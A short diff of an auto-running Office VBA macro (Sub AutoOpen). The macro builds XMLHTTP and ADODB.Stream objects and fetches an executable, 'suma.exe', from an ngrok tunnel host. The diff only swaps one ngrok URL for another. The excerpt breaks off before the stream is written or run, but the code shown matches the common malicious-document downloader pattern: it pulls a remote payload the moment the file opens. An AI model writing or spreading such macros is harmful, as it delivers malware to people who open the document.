@@ -2,7 +2,7 @@ Sub AutoOpen()
 
 Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
 Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
-xHttp.Open "GET", "http://b877de48de9a.ngrok.io/example/suma.exe", False
+xHttp.Open "GET", "http://97bf484ee8de.ngrok.io/example/suma.exe", False
 xHttp.Send
 
 With bStrm
